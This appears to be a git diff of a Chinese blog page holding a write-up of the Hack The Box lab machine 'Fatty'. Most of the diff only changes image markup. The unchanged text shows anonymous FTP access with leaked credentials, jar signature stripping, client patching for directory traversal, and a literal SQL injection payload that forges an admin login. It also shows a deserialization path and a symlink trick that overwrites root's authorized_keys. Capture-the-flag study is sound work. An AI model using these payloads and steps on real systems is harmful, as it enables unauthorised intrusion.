@@ -141,7 +141,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -238,40 +238,117 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">➜  Fatty ftp 10.10.10.174</span><br><span class="line">Connected to 10.10.10.174.</span><br><span class="line">220 qtc's development server</span><br><span class="line">Name (10.10.10.174:miao): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> quote pasv</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,174,185,136).</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> passive</span></span><br><span class="line">Passive mode on.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">227 Entering Passive Mode (10,10,10,174,187,39).</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar</span><br><span class="line">-rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt</span><br><span class="line">-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get *</span></span><br><span class="line">local: * remote: *</span><br><span class="line">227 Entering Passive Mode (10,10,10,174,193,90).</span><br><span class="line">550 Failed to open file.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> mget *</span></span><br><span class="line">mget fatty-client.jar?</span><br><span class="line">227 Entering Passive Mode (10,10,10,174,179,171).</span><br><span class="line">150 Opening BINARY mode data connection for fatty-client.jar (15426727 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">15426727 bytes received in 23.40 secs (643.7956 kB/s)</span><br><span class="line">mget note.txt?</span><br><span class="line">227 Entering Passive Mode (10,10,10,174,179,86).</span><br><span class="line">150 Opening BINARY mode data connection for note.txt (526 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">526 bytes received in 0.00 secs (3.1549 MB/s)</span><br><span class="line">mget note2.txt?</span><br><span class="line">227 Entering Passive Mode (10,10,10,174,179,254).</span><br><span class="line">150 Opening BINARY mode data connection for note2.txt (426 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">426 bytes received in 0.00 secs (308.3882 kB/s)</span><br><span class="line">mget note3.txt?</span><br><span class="line">227 Entering Passive Mode (10,10,10,174,162,237).</span><br><span class="line">150 Opening BINARY mode data connection for note3.txt (194 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">194 bytes received in 0.00 secs (142.7680 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
 
 <p> 3个txt和一个jar文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080501.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080501.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>那个jar文件应该是连接某个服务的客户端，那个服务原本是8000端口，现在改成了1337端口，并且给出了运行环境问题和一组账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User: qtc</span><br><span class="line">Pass: clarabibi</span><br></pre></td></tr></table></figure>
 
 <h1 id="fatty-client-jar"><a href="#fatty-client-jar" class="headerlink" title="fatty-client.jar"></a>fatty-client.jar</h1><h2 id="代理连接"><a href="#代理连接" class="headerlink" title="代理连接"></a>代理连接</h2><p>直接运行是连接失败：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080502.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080502.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>根据前面的信息，以及反编译看代码，我们知道客户端配置的是8000端口，而现在服务是在1337端口，我们需要想办法进行转发(或者直接修改代码重新打包，需要解决签名校验)：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080503.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080503.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这里可以直接用simpleproxy之类的做个代理,并且配置好hosts：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">simpleproxy -L 8000 -R 10.10.10.174:1337</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> hosts</span></span><br><span class="line">10.211.55.12 server.fatty.htb</span><br></pre></td></tr></table></figure>
 
 <p>然后就可以成功登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080504.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080504.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="修改重打包"><a href="#修改重打包" class="headerlink" title="修改重打包"></a>修改重打包</h2><p>直接反编译修改重新打包运行的话，会有一个签名校验问题：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081001.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081001.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 修改后重新打包：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cmf META-INF&#x2F;MANIFEST.MF ..&#x2F;new.jar *</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081002.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081002.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>运行登录会得到如上报错，存在校验，beans.xml被修改导致不匹配，<code>SHA-256 digest error for beans.xml</code></p>
 <p>可以直接把 META-INF/1.RSA META-INF/1.SF这两个文件删了，然后打包，就可以解决签名校验问题：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081003.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081003.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="文件浏览"><a href="#文件浏览" class="headerlink" title="文件浏览"></a>文件浏览</h2><p>有一个文件浏览功能，限定目录，根据报错可以得到基础路径：<code>/opt/fatty/files/</code></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080505.jpg" alt="("></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020080505.jpg" alt="(" title="">
+                </div>
+                <div class="image-caption">(</div>
+            </figure>
+
 <p>反编译可以看到这个功能应该是在Invoker中的showFile函数中将Folder作为参数，sendAndRecv</p>
 <p>另外ClientGuiTest中定义目录名，我们可以修改后获取其他目录文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081004.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081004.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>例如将config目录修改成<code>..</code>，从而查看上层目录文件</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081005.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081005.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p> 下面是直接修改jd-gui反编译的java文件，然后patch到原本的jar</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">zip -d fatty-client.jar META-INF/1.RSA META-INF/1.SF</span><br><span class="line">zip -ur fatty-client.jar .</span><br><span class="line"></span><br><span class="line">javac -cp ../fatty-client.jar htb/fatty/client/gui/ClientGuiTest.java</span><br><span class="line">mkdir raw</span><br><span class="line">cp fatty-client.jar raw/fatty-client.jar</span><br><span class="line">cd raw &amp;&amp; unzip fatty-client.jar</span><br><span class="line">cd .. &amp;&amp; mv htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/</span><br><span class="line">cd raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF traverse.jar .</span><br><span class="line">java -jar traverse.jar</span><br></pre></td></tr></table></figure>
 
 <p>然后发现一个fatty-server.jar文件：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081006.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081006.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Unfortunately alpine docker containers seems to have problems with services.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> both services are now started as part of the docker startup script.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Start cron service</span></span><br><span class="line">crond -b</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Start ssh server</span></span><br><span class="line">/usr/sbin/sshd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Start Java application server</span></span><br><span class="line">su - qtc /bin/sh -c "java -jar /opt/fatty/fatty-server.jar"</span><br></pre></td></tr></table></figure>
 
 
@@ -279,11 +356,36 @@
 <h1 id="fatty-server-jar"><a href="#fatty-server-jar" class="headerlink" title="fatty-server.jar"></a>fatty-server.jar</h1><h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>这里我们修改open函数用于下载fatty-server.jar文件：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line">FileOutputStream fos;</span><br><span class="line">                fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/fatty-server.jar"</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.response.hasError()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"Error: Your action caused an error on the application server!"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String response = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    response = <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    response = <span class="string">"Unable to convert byte[] to String. Did you read in a binary file?"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                fos.write(<span class="keyword">this</span>.response.getContent());</span><br><span class="line">                fos.close();</span><br><span class="line">                <span class="keyword">return</span> response;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081007.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081007.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>之后重新打包运行,下载得到fatty-server.jar文件:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081008.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081008.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>同样是反编译，然后<code>FattyDbSession.java:checkLogin(User user)</code>有一个注入：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081009.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081009.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <p>就是客户端登录时username那里注入</p>
 <h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><p>htb/fatty/client/shared/resources/user.java得到密码加密方式，username没经过任何处理：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(<span class="keyword">int</span> uid, String username, String password, String email, Role role)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.uid = uid;</span><br><span class="line">    <span class="keyword">this</span>.username = username;</span><br><span class="line">    String hashString = <span class="keyword">this</span>.username + password + <span class="string">"clarabibimakeseverythingsecure"</span>;</span><br><span class="line">    MessageDigest digest = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      digest = MessageDigest.getInstance(<span class="string">"SHA-256"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">byte</span>[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">    <span class="keyword">this</span>.password = DatatypeConverter.printHexBinary(hash);</span><br><span class="line">    <span class="keyword">this</span>.email = email;</span><br><span class="line">    <span class="keyword">this</span>.role = role;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
@@ -293,7 +395,14 @@
 
 
 <h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>基本就是分析代码，构造注入,  客户端也需要做下修改方便操作：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081010.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081010.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>然后使用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username : abc&#39; UNION SELECT 1,&#39;abc&#39;,&#39;a@b.com&#39;,&#39;abc&#39;,&#39;admin</span><br><span class="line">Password : abc</span><br></pre></td></tr></table></figure>
 
@@ -301,21 +410,56 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id,username,email,password,role FROM users WHERE username&#x3D;&#39;abc&#39; UNION SELECT 1,&#39;abc&#39;,&#39;a@b.com&#39;,&#39;abc&#39;,&#39;admin</span><br></pre></td></tr></table></figure>
 
 <p> 然后就可以伪造管理员登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081011.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081011.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>登录后修改密码功能有反序列化：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081012.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081012.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>参考资料：</p>
 <ul>
 <li>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
 </ul>
 <p>修改密码功能在客户端没完全实现，需要自己修补代码</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="添加功能"><a href="#添加功能" class="headerlink" title="添加功能"></a>添加功能</h2><p>首先修改changePW函数，使其发送payload：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">changePW</span><span class="params">(String payload)</span> <span class="keyword">throws</span> MessageParseException, MessageBuildException, IOException </span>&#123;</span><br><span class="line">                <span class="keyword">this</span>.action = <span class="keyword">new</span> ActionMessage(<span class="keyword">this</span>.sessionID, <span class="string">"changePW"</span>);</span><br><span class="line">                <span class="keyword">this</span>.action.addArgument(payload);</span><br><span class="line">                sendAndRecv();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.response.hasError()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">"Error: Your action caused an error on the application server!"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.response.getContentAsString();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后修改changePW执行函数：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jButton4.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent param1ActionEvent)</span> </span>&#123;</span><br><span class="line">                    String str1 = <span class="string">""</span>;</span><br><span class="line">                    String str2 = ClientGuiTest.<span class="keyword">this</span>.textField_1.getText();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        str1 = ClientGuiTest.<span class="keyword">this</span>.invoker.exploitChangePW(str2);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (MessageBuildException|htb.fatty.shared.message.MessageParseExceptionmessageBuildException) &#123;</span><br><span class="line">                        JOptionPane.showMessageDialog(controlPanel, <span class="string">"Failure during message building/parsing."</span>, <span class="string">"Error"</span>, <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException iOException) &#123;</span><br><span class="line">                        JOptionPane.showMessageDialog(controlPanel, <span class="string">"Unable to contact the server. If this problem remains, please close and reopen the client."</span>, <span class="string">"Error"</span>, <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    textPane.setText(str1);</span><br><span class="line">                    passwordChange.setVisible(<span class="keyword">false</span>);</span><br><span class="line">                    controlPanel.setVisible(<span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure>
 
 <p>我这里不小心删掉了修改好的jar包，不想重新开始一点点改了，后面的主要就是流程</p>
@@ -330,11 +474,34 @@
 
 <p>如果我们使用软连接，将/root/.ssh/authorized_keys软连接到/opt/fatty/tar/logs.tar，然后它会自动scp到host之后解压，导致：</p>
 <p>/unknown/location/logs.tar -&gt; /root/.ssh/authorized_keys</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081104.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>然后我们把公钥写到logs.tar，等待下一次备份即可覆写server的/root/.ssh/authorized_keys</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081105.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <p>然后我们直接用自己的私钥即可登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081106.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020081106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>登录上去直接读root.txt:</p>
 <p>ee98****d9c7</p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
